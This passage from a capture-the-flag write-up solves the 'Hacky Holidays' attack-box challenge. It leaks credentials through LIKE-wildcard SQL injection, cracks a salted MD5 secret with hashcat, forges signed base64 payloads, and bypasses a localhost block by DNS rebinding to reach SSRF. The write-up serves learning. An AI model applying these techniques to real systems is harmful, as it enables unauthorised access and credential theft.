/api/user -> username, password
/api/ping -> 
```

A bit of fuzzing the parameter username and password reveals 
* sending `username=%&password=%` returns `Invalid content type detected`
* sending `username=%&password=ZZZ%` returns `Expected HTTP status 200, Received: 204`

Seems like the SQL query behind looks like
```sql
select * from table where username like '$USERNAME' and password like '$PASSWORD'
```
where $USERNAME and $PASSWORD are user input. 
As we can use '%' in like queries, we can use this slowly leak the credentials.

```sql
select * from table where username like 'a%' and password like '%'; <- 204 
select * from table where username like 'b%' and password like '%'; <- 204 
select * from table where username like 'c%' and password like '%'; <- 204 
...
select * from table where username like 'g%' and password like '%'; <- HIT.. Invalid content type detected 
```

We can write a python script to brute force username and password as follows:

[solver-h1-ctf-flag-11.py](/assets/files/h1-ctf-flag-11.py)

This gives `username = grinchadmin`, `password = s4nt4sucks`.

Challenge Url: https://hackyholidays.h1ctf.com/attack-box
```

### Understanding the web-app

Visiting https://hackyholidays.h1ctf.com/attack-box we are given 3 IP addresses and an option to attack them. 
* `IP=203.0.113.33`: attack url = https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==  

Attack url is base64 encoded JSON: 
```json=
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

Visiting the attack URL seems like it tries to DDOS the target URL. Currently, I wasn't really sure whats the end goal.

### Fuzzing/Recon

Trying a Directory search doesn't reveal any hidden directory. Changing the target IP address to some other value gives an error. Trying injections in target and hash didn't work either. 

I tried GitHub Dorking, google hacking, s3 brute force, and many other recon tricks none worked. 

Next immediate step I can think of trying to crack the hash. Having the ability to change target-IP should give us some SSRF. So let's try to crack the hash.

The hash can be formed in either of 2 ways:
* hash = "IP + SECRET"
OR
* hash = "SECRET + IP"

hashcat support cracking both types of hashes as follows:

* `hashcat -m 10` FOR "SECRET + IP"
* `hashcat -m 20` FOR "IP + SECRET"


```bash
>> echo "5f2940d65ca4140cc18d0878bc398955:203.0.113.33" > secret-ip.hash
>> echo "203.0.113.33:5f2940d65ca4140cc18d0878bc398955" > ip-secret.hash
>> hashcat -m 10 -a 0  secret-ip.hash rockyou.txt  --force
5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463
```

Ok great, we have a hit. The `SECRET` used to create the hash is `mrgrinch463`. We can verify it as

```bash
>> sapra@Mabook-pro $ echo -ne 'mrgrinch463203.0.113.33' | md5
5f2940d65ca4140cc18d0878bc398955 # this is sae as original hash
```




Lets try to change target ip to 127.0.0.1
```bash
>> sapra@Mabook-pro $ echo -ne 'mrgrinch463127.0.0.1' | md5
3e3f8df1658372edf0214e202acb460b

>> echo {"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"} | base64

Base64 = eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQo=

Visit https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQo=

```

We get `Local target detected, aborting attack`. Seems like we need to attack localhost, but its not allowed. Trying few SSRF bypass tricks like 
* using decimal IP
* Using Ipv6
* DNS-rebinding
* Using 302 redirect.
...

I got DNS-rebinding working. Steps to reproduce:

* Goto https://lock.cmpxchg8b.com/rebinder.html . This service provides the host with two 'A' Records which we can configure as required. So I configured them as follows:
    * 1st A record - 127.0.0.1
    * 2nd A record - 8.8.8.8
* This gives me host: `http://7f000001.08080808.rbndr.us`.
* create `hash` with the above host 
```bash
>> sapra@MacBook-Pro $ echo -ne 'mrgrinch4637f000001.08080808.rbndr.us' | md5
00830ee7e57f7d81ce889bd12a7cb0bd
```
* create base64 encoded JSON
```bash
>> sapra@Macbook-pro $ echo -ne {"target":"7f000001.08080808.rbndr.us","hash":"00830ee7e57f7d81ce889bd12a7cb0bd"} | base64
eyJ0YXJnZXQiOiI3ZjAwMDAwMS4wODA4MDgwOC5yYm5kci51cyIsImhhc2giOiIwMDgzMGVlN2U1N2Y3ZDgxY2U4ODliZDEyYTdjYjBiZCJ9
```
* visit https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS4wODA4MDgwOC5yYm5kci51cyIsImhhc2giOiIwMDgzMGVlN2U1N2Y3ZDgxY2U4ODliZDEyYTdjYjBiZCJ9 . It might not work on first go, so visit the URL multiple times. 
    * Reason being DNS rebinding works on the logic of TOC-TOU(time of check, time of use). When checking the IP address against blacklist IP(127.0.0.1), the software makes a DNS query and gets IP=8.8.8.8.
    * This passes the blacklist check and do an original request to `7f000001.08080808.rbndr.us` which then resolves to IP=127.0.0.1
    * The attack is not 100% reliable because the DNS server can send any IP for the host so we need to run it multiple times
